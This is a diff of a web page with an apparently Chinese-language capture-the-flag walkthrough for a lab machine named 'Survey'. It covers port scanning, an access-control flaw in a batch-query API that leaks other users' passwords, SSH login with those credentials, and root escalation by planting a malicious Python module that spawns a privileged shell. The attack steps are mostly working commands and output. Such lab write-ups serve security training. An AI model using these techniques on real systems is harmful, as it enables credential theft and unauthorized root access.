@@ -96,15 +96,15 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     <div id="content">
 <div class="markdown-body" id="postBody"><h2>信息收集</h2>
 <h3>扫存活主机并定位目标</h3>
-<pre lang="bash"><code>sudo arp-scan -l
+<pre lang="bash" class="notranslate"><code class="notranslate">sudo arp-scan -l
 </code></pre>
-<pre lang="text"><code>192.168.205.139 08:00:27:f5:68:b0       PCS Systemtechnik GmbH
+<pre lang="text" class="notranslate"><code class="notranslate">192.168.205.139 08:00:27:f5:68:b0       PCS Systemtechnik GmbH
 </code></pre>
-<p>我这里先用 <code>arp-scan</code> 把网段活主机捞出来，<code>192.168.205.139</code> 看起来就是靶机。</p>
+<p>我这里先用 <code class="notranslate">arp-scan</code> 把网段活主机捞出来，<code class="notranslate">192.168.205.139</code> 看起来就是靶机。</p>
 <h3>全端口扫描</h3>
-<pre lang="bash"><code>nmap -p 0-65535 192.168.205.139
+<pre lang="bash" class="notranslate"><code class="notranslate">nmap -p 0-65535 192.168.205.139
 </code></pre>
-<pre lang="text"><code>PORT     STATE SERVICE
+<pre lang="text" class="notranslate"><code class="notranslate">PORT     STATE SERVICE
 22/tcp   open  ssh
 80/tcp   open  http
 3000/tcp open  ppp
@@ -112,154 +112,153 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <p>全端口扫出来只有 22、80、3000，说明攻击面很收敛，重点就放在 Web 和 SSH 凭据获取上。</p>
 <h2>Web 入口摸索</h2>
 <h3>看 80 和 3000 的响应</h3>
-<pre lang="bash"><code>curl 192.168.205.139
+<pre lang="bash" class="notranslate"><code class="notranslate">curl 192.168.205.139
 </code></pre>
-<pre lang="text"><code>index
+<pre lang="text" class="notranslate"><code class="notranslate">index
 </code></pre>
-<p>80 端口只回了个 <code>index</code>，没什么直接价值。</p>
-<pre lang="bash"><code>curl 192.168.205.139:3000
+<p>80 端口只回了个 <code class="notranslate">index</code>，没什么直接价值。</p>
+<pre lang="bash" class="notranslate"><code class="notranslate">curl 192.168.205.139:3000
 </code></pre>
-<pre lang="html"><code>&lt;title&gt;Redirecting...&lt;/title&gt;
+<pre lang="html" class="notranslate"><code class="notranslate">&lt;title&gt;Redirecting...&lt;/title&gt;
 ...
-&lt;a href=&quot;/fill&quot;&gt;/fill&lt;/a&gt;
+&lt;a href="/fill"&gt;/fill&lt;/a&gt;
 </code></pre>
-<p>3000 会跳到 <code>/fill</code>，明显是主业务入口。</p>
-<pre lang="bash"><code>curl 192.168.205.139:3000/fill
+<p>3000 会跳到 <code class="notranslate">/fill</code>，明显是主业务入口。</p>
+<pre lang="bash" class="notranslate"><code class="notranslate">curl 192.168.205.139:3000/fill
 </code></pre>
-<pre lang="html"><code>&lt;form method=&quot;POST&quot; action=&quot;/fill&quot;&gt;
+<pre lang="html" class="notranslate"><code class="notranslate">&lt;form method="POST" action="/fill"&gt;
   ...
-  &lt;input type=&quot;text&quot; name=&quot;userid&quot; required placeholder=&quot;输入你的ID&quot;&gt;
-  &lt;input type=&quot;password&quot; name=&quot;password&quot; required placeholder=&quot;输入密码用于团队内部系统分配&quot;&gt;
+  &lt;input type="text" name="userid" required placeholder="输入你的ID"&gt;
+  &lt;input type="password" name="password" required placeholder="输入密码用于团队内部系统分配"&gt;
 &lt;/form&gt;
 </code></pre>
-<p>页面是个“团队成员信息调查”表单，字段就俩：<code>userid</code> 和 <code>password</code>。这种地方我会顺手测一把模板注入。</p>
+<p>页面是个“团队成员信息调查”表单，字段就俩：<code class="notranslate">userid</code> 和 <code class="notranslate">password</code>。这种地方我会顺手测一把模板注入。</p>
 <h3>SSTI 试探（失败）</h3>
-<pre lang="bash"><code>curl -i -c c.txt -b c.txt -X POST 'http://192.168.205.139:3000/fill' \
-  --data-urlencode &quot;userid={{7*7}}&quot; \
-  --data-urlencode &quot;password=test&quot;
+<pre lang="bash" class="notranslate"><code class="notranslate">curl -i -c c.txt -b c.txt -X POST 'http://192.168.205.139:3000/fill' \
+  --data-urlencode "userid={{7*7}}" \
+  --data-urlencode "password=test"
 </code></pre>
-<pre lang="text"><code>HTTP/1.0 302 FOUND
+<pre lang="text" class="notranslate"><code class="notranslate">HTTP/1.0 302 FOUND
 Location: http://192.168.205.139:3000/view?id=10
 Set-Cookie: session=...
 </code></pre>
-<p>我把 <code>{{7*7}}</code> 塞进 <code>userid</code>，服务端给了会话并跳转到 <code>/view?id=10</code>。后面看到页面把它按字面量显示并做了 HTML 转义，这个点的 SSTI 基本能排除。</p>
+<p>我把 <code class="notranslate">{{7*7}}</code> 塞进 <code class="notranslate">userid</code>，服务端给了会话并跳转到 <code class="notranslate">/view?id=10</code>。后面看到页面把它按字面量显示并做了 HTML 转义，这个点的 SSTI 基本能排除。</p>
 <h2>/api/export 越权拿凭据</h2>
 <h3>枚举接口路径</h3>
-<pre lang="bash"><code>dirsearch -q -u 192.168.205.139:3000/api
+<pre lang="bash" class="notranslate"><code class="notranslate">dirsearch -q -u 192.168.205.139:3000/api
 </code></pre>
-<pre lang="text"><code>[23:30:15] 400 -   33B  - http://192.168.205.139:3000/api/export
+<pre lang="text" class="notranslate"><code class="notranslate">[23:30:15] 400 -   33B  - http://192.168.205.139:3000/api/export
 </code></pre>
-<p><code>/api/export</code> 直接浮出来了，返回 400 通常意味着“接口存在但参数不对”。</p>
+<p><code class="notranslate">/api/export</code> 直接浮出来了，返回 400 通常意味着“接口存在但参数不对”。</p>
 <h3>验证参数逻辑和授权边界</h3>
-<pre lang="bash"><code>curl 'http://192.168.205.139:3000/api/export'
+<pre lang="bash" class="notranslate"><code class="notranslate">curl 'http://192.168.205.139:3000/api/export'
 </code></pre>
-<pre lang="json"><code>{&quot;error&quot;:&quot;Missing id parameter&quot;}
+<pre lang="json" class="notranslate"><code class="notranslate">{"error":"Missing id parameter"}
 </code></pre>
-<p>没带 <code>id</code> 会报缺参，接口逻辑清楚了。</p>
-<pre lang="bash"><code>curl 'http://192.168.205.139:3000/api/export?id=1'
+<p>没带 <code class="notranslate">id</code> 会报缺参，接口逻辑清楚了。</p>
+<pre lang="bash" class="notranslate"><code class="notranslate">curl 'http://192.168.205.139:3000/api/export?id=1'
 </code></pre>
-<pre lang="json"><code>{&quot;error&quot;:&quot;未授权访问！仅限系统内部成员调用此 API。&quot;}
+<pre lang="json" class="notranslate"><code class="notranslate">{"error":"未授权访问！仅限系统内部成员调用此 API。"}
 </code></pre>
 <p>匿名状态访问会被拒绝，说明要带前面问卷流程下发的 session和cookie。</p>
-<pre lang="bash"><code>curl -i -b c.txt 'http://192.168.205.139:3000/api/export?id=10'
+<pre lang="bash" class="notranslate"><code class="notranslate">curl -i -b c.txt 'http://192.168.205.139:3000/api/export?id=10'
 </code></pre>
-<pre lang="json"><code>{
-  &quot;_meta&quot;:{
-    &quot;hint&quot;:&quot;提示：此接口支持批量查询，可提高效率（格式：id=1,2,3）&quot;,
-    &quot;query_type&quot;:&quot;single&quot;
+<pre lang="json" class="notranslate"><code class="notranslate">{
+  "_meta":{
+    "hint":"提示：此接口支持批量查询，可提高效率（格式：id=1,2,3）",
+    "query_type":"single"
   },
-  &quot;data&quot;:[{&quot;member_user_id&quot;:&quot;{{7*7}}&quot;,&quot;survey_id&quot;:10,&quot;system_password&quot;:&quot;test&quot;}],
-  &quot;status&quot;:&quot;success&quot;
+  "data":[{"member_user_id":"{{7*7}}","survey_id":10,"system_password":"test"}],
+  "status":"success"
 }
 </code></pre>
-<p>带上 cookie 后能正常查到我自己的记录。关键是它主动给了提示：支持 <code>id=1,2,3</code> 批量查询。</p>
+<p>带上 cookie 后能正常查到我自己的记录。关键是它主动给了提示：支持 <code class="notranslate">id=1,2,3</code> 批量查询。</p>
 <h3>利用批量查询做越权</h3>
-<pre lang="bash"><code>curl -i -b c.txt 'http://192.168.205.139:3000/api/export?id=10,1'
+<pre lang="bash" class="notranslate"><code class="notranslate">curl -i -b c.txt 'http://192.168.205.139:3000/api/export?id=10,1'
 </code></pre>
-<pre lang="json"><code>{
-  &quot;_meta&quot;:{&quot;query_type&quot;:&quot;batch&quot;},
-  &quot;data&quot;:[
-    {&quot;member_user_id&quot;:&quot;{{7*7}}&quot;,&quot;survey_id&quot;:10,&quot;system_password&quot;:&quot;test&quot;},
-    {&quot;member_user_id&quot;:&quot;fake_member_1&quot;,&quot;survey_id&quot;:1,&quot;system_password&quot;:&quot;P@ss_fake_1!!&quot;}
+<pre lang="json" class="notranslate"><code class="notranslate">{
+  "_meta":{"query_type":"batch"},
+  "data":[
+    {"member_user_id":"{{7*7}}","survey_id":10,"system_password":"test"},
+    {"member_user_id":"fake_member_1","survey_id":1,"system_password":"P@ss_fake_1!!"}
   ],
-  &quot;status&quot;:&quot;success&quot;
+  "status":"success"
 }
 </code></pre>
 <p>这一步就坐实了：只要混进“我自己的 id=10”，就能把别人的记录一并带出来，典型越权。</p>
-<pre lang="bash"><code>for i in $(seq 1 10); do
-  curl -s -b c.txt &quot;http://192.168.205.139:3000/api/export?id=10,$i&quot; \
-  | jq -r '.data[]? | &quot;\(.survey_id)\t\(.member_user_id)\t\(.system_password)&quot;'
+<pre lang="bash" class="notranslate"><code class="notranslate">for i in $(seq 1 10); do
+  curl -s -b c.txt "http://192.168.205.139:3000/api/export?id=10,$i" \
+  | jq -r '.data[]? | "\(.survey_id)\t\(.member_user_id)\t\(.system_password)"'
 done
 </code></pre>
-<pre lang="text"><code>...
+<pre lang="text" class="notranslate"><code class="notranslate">...
 6       x3x     p@ssw0rd_x3x
 ...
 </code></pre>
-<p>批量跑一遍后，真正可用的不是那些 fake 账号，而是 <code>x3x / p@ssw0rd_x3x</code> 这组看起来像系统真实用户凭据。</p>
+<p>批量跑一遍后，真正可用的不是那些 fake 账号，而是 <code class="notranslate">x3x / p@ssw0rd_x3x</code> 这组看起来像系统真实用户凭据。</p>
 <h2>SSH 落地与本地提权</h2>
 <h3>用泄露凭据登录 SSH</h3>
-<pre lang="bash"><code>ssh x3x@192.168.205.139
+<pre lang="bash" class="notranslate"><code class="notranslate">ssh x3x@192.168.205.139
 </code></pre>
-<pre lang="text"><code>x3x@Survey:~$ id
+<pre lang="text" class="notranslate"><code class="notranslate">x3x@Survey:~$ id
 uid=1001(x3x) gid=1001(x3x) groups=1001(x3x)
 </code></pre>
-<p>凭据可用，直接进了机器，拿到普通用户 <code>x3x</code>。</p>
+<p>凭据可用，直接进了机器，拿到普通用户 <code class="notranslate">x3x</code>。</p>
 <h3>查 sudo 权限</h3>
-<pre lang="bash"><code>sudo -l
+<pre lang="bash" class="notranslate"><code class="notranslate">sudo -l
 </code></pre>
-<pre lang="text"><code>User x3x may run the following commands on Survey:
+<pre lang="text" class="notranslate"><code class="notranslate">User x3x may run the following commands on Survey:
     (root) NOPASSWD: /usr/bin/python3 /opt/maze_admin/generate_report.py
 </code></pre>
 <p>这里是无密码 sudo 跑一个固定 Python 脚本，提权窗口已经打开了。</p>
 <h3>分析脚本与可写模块路径</h3>
-<pre lang="bash"><code>ls -al /opt/maze_admin/generate_report.py
+<pre lang="bash" class="notranslate"><code class="notranslate">ls -al /opt/maze_admin/generate_report.py
 cat /opt/maze_admin/generate_report.py
 </code></pre>
-<pre lang="python"><code>import os
+<pre lang="python" class="notranslate"><code class="notranslate">import os
 import sys
 import time
-sys.path.insert(0, &quot;/opt/maze_admin/libs&quot;)
+sys.path.insert(0, "/opt/maze_admin/libs")
 
 import report_formatter
 
-print(&quot;[*] 正在启动 Maze 团队日志分析模块...&quot;)
+print("[*] 正在启动 Maze 团队日志分析模块...")
 time.sleep(1)
 report_formatter.print_header()
 
-print(&quot;[*] 分析完成，未发现异常日志。&quot;)
+print("[*] 分析完成，未发现异常日志。")
 </code></pre>
-<p>脚本把 <code>/opt/maze_admin/libs</code> 插到了 <code>sys.path</code> 前面，再导入 <code>report_formatter</code>，这就要看这个目录和模块文件权限。</p>
-<pre lang="bash"><code>ls -la /opt/maze_admin/libs
+<p>脚本把 <code class="notranslate">/opt/maze_admin/libs</code> 插到了 <code class="notranslate">sys.path</code> 前面，再导入 <code class="notranslate">report_formatter</code>，这就要看这个目录和模块文件权限。</p>
+<pre lang="bash" class="notranslate"><code class="notranslate">ls -la /opt/maze_admin/libs
 </code></pre>
-<pre lang="text"><code>drwxrwxr-x 2 root x3x  4096 Feb 23 07:23 .
+<pre lang="text" class="notranslate"><code class="notranslate">drwxrwxr-x 2 root x3x  4096 Feb 23 07:23 .
 -rw-r--r-- 1 root root  161 Feb 23 07:23 report_formatter.py
 </code></pre>
-<p>目录对组 <code>x3x</code> 可写，虽然原文件不可写，但我可以通过目录写权限重命名旧文件并放一个同名恶意模块。</p>
+<p>目录对组 <code class="notranslate">x3x</code> 可写，虽然原文件不可写，但我可以通过目录写权限重命名旧文件并放一个同名恶意模块。</p>
 <h3>替换 report_formatter.py 并触发 root shell</h3>
 <p>恶意模块内容：</p>
-<pre lang="python"><code>import os
+<pre lang="python" class="notranslate"><code class="notranslate">import os
 def print_header():
-    os.system(&quot;/bin/bash -p&quot;)
+    os.system("/bin/bash -p")
 </code></pre>
 <p>执行替换并触发：</p>
-<pre lang="bash"><code>cd /opt/maze_admin/libs
+<pre lang="bash" class="notranslate"><code class="notranslate">cd /opt/maze_admin/libs
 mv report_formatter.py 1.py
 vim report_formatter.py
 sudo /usr/bin/python3 /opt/maze_admin/generate_report.py
 </code></pre>
-<pre lang="text"><code>[*] 正在启动 Maze 团队日志分析模块...
+<pre lang="text" class="notranslate"><code class="notranslate">[*] 正在启动 Maze 团队日志分析模块...
 root@Survey:/opt/maze_admin/libs# id
 uid=0(root) gid=0(root) groups=0(root)
 </code></pre>
-<p><code>generate_report.py</code> 以 root 身份导入了我伪造的 <code>report_formatter</code>，<code>/bin/bash -p</code> 直接把 root shell 弹出来了。</p>
+<p><code class="notranslate">generate_report.py</code> 以 root 身份导入了我伪造的 <code class="notranslate">report_formatter</code>，<code class="notranslate">/bin/bash -p</code> 直接把 root shell 弹出来了。</p>
 <h2>权限验证与取证据</h2>
-<pre lang="bash"><code>cat /root/root.txt /home/x3x/user.txt
+<pre lang="bash" class="notranslate"><code class="notranslate">cat /root/root.txt /home/x3x/user.txt
 </code></pre>
-<pre lang="text"><code>flag{root-866fa8a4-b5bc-4907-b549-b89a024f5f47}
+<pre lang="text" class="notranslate"><code class="notranslate">flag{root-866fa8a4-b5bc-4907-b549-b89a024f5f47}
 flag{user-cafa5f8b-6a6f-4ae5-9fe7-6a734e378acd}
 </code></pre>
-<p>两个 flag 都拿到并验证完成。</p>
-</div>
+<p>两个 flag 都拿到并验证完成。</p></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
